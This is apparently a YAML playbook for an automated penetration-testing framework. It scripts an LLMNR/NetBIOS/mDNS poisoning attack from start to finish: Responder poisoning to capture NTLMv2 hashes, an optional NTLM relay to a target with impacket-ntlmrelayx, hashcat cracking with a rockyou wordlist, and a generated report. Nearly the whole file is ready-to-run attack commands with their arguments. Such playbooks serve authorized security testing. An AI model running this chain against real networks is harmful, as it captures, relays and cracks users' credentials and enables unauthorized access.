name: "LLMNR / NetBIOS / MDNS Poisoning (Responder)"
description: "Poison LLMNR, NetBIOS, and mDNS traffic with Responder to capture NTLMv2 hashes, then relay or crack them"
version: "2.0"

vars:
  interface: "eth0"
  relay_target: ""

preflight:
  - id: setup
    type: log
    message: "LLMNR/NetBIOS poisoning on {interface} (case: {case_id})"

steps:
  # ---- Phase 1: Analysis mode ----
  - id: analyze
    name: "Analyze network for LLMNR/NBT-NS traffic"
    type: sequential
    steps:
      - id: responder_analyze
        name: "Responder analysis mode (no poisoning)"
        tool: responder
        args: ["-I", "{interface}", "-A", "-v",
               "-o", "{case_dir}/responder_analyze.log"]
        timeout: 120
        artifacts: ["{case_dir}/responder_analyze.log"]

      - id: nmap_llmnr
        name: "Nmap LLMNR discovery"
        tool: nmap
        args: ["-sU", "-p", "5355", "--script", "llmnr-info",
               "{target}", "-oN", "{case_dir}/llmnr_nmap.txt"]
        timeout: 60

      - id: nbtscan
        name: "NetBIOS name scan"
        tool: nbtscan
        args: ["-r", "{target}", "-o", "{case_dir}/nbtscan_netbios.txt"]
        timeout: 60

  # ---- Phase 2: Poison mode ----
  - id: poison
    name: "LLMNR/NetBIOS/mDNS poisoning"
    type: sequential
    steps:
      - id: responder_poison
        name: "Responder poisoning (capture hashes)"
        tool: responder
        args: ["-I", "{interface}", "-w", "-r", "-d", "-F", "-v",
               "-o", "{case_dir}/responder_poison.log"]
        timeout: 600
        artifacts: ["{case_dir}/responder_poison.log"]

      - id: responder_session
        name: "Check captured hashes"
        tool: ls
        args: ["-la", "/usr/share/responder/logs/",
               "-o", "{case_dir}/responder_hashes.txt"]
        timeout: 10

  # ---- Phase 3: SMB relay ----
  - id: relay
    name: "NTLM relay to target"
    type: conditional
    condition:
      any:
        - exists: "{relay_target}"
    then:
      - id: responder_relay
        name: "Responder with SMB relay"
        tool: responder
        args: ["-I", "{interface}", "-w", "-r", "-d", "-F",
               "-o", "{case_dir}/responder_relay.log"]
        timeout: 600

      - id: ntlmrelayx
        name: "Impacket ntlmrelayx to target"
        tool: impacket-ntlmrelayx
        args: ["-tf", "{relay_target}",
               "-smb2support",
               "-o", "{case_dir}/ntlmrelayx_output"]
        timeout: 300
        artifacts: ["{case_dir}/ntlmrelayx_output*"]

  # ---- Phase 4: Collect & crack ----
  - id: collect
    name: "Collect and crack captured hashes"
    type: sequential
    steps:
      - id: copy_hashes
        name: "Copy hashes from Responder logs"
        tool: cp
        args: ["/usr/share/responder/logs/*.txt",
               "{case_dir}/responder_captures/"]
        timeout: 30

      - id: hashcat_crack
        name: "Crack NTLMv2 with hashcat (mode 5600)"
        tool: hashcat
        args: ["-m", "5600", "{case_dir}/responder_captures/*.txt",
               "/wordlists/rockyou.txt",
               "--outfile", "{case_dir}/responder_cracked.txt",
               "--show"]
        timeout: 600
        artifacts: ["{case_dir}/responder_cracked.txt"]

  # ---- Phase 5: Report ----
  - id: report
    name: "Responder attack report"
    type: report
    format: markdown
    title: "LLMNR/NetBIOS/mDNS Poisoning Report — {interface}"
    output: "{case_dir}/responder-report.md"
    sections:
      - heading: "Target"
        body: "- Interface: {interface}"
      - heading: "Analysis"
        body: "- Responder analysis: {case_dir}/responder_analyze.log\n- LLMNR nmap: {case_dir}/llmnr_nmap.txt\n- NetBIOS scan: {case_dir}/nbtscan_netbios.txt"
      - heading: "Poisoning Results"
        body: "- Poison log: {case_dir}/responder_poison.log\n- Captured hashes: {case_dir}/responder_captures/*.txt"
      - heading: "Relay (if configured)"
        body: "- Responder relay: {case_dir}/responder_relay.log\n- ntlmrelayx output: {case_dir}/ntlmrelayx_output*"
      - heading: "Cracked Hashes"
        body: "- Cracked: {case_dir}/responder_cracked.txt\n- Run: hashcat -m 5600 <hashfile> /wordlists/rockyou.txt"

postflight:
  - id: cleanup
    type: log
    message: "Responder poisoning complete — {case_dir}"
  - id: notify_done
    type: notify
    level: success
    message: "LLMNR/NetBIOS/mDNS poisoning finished on {interface}. Results in {case_dir}"
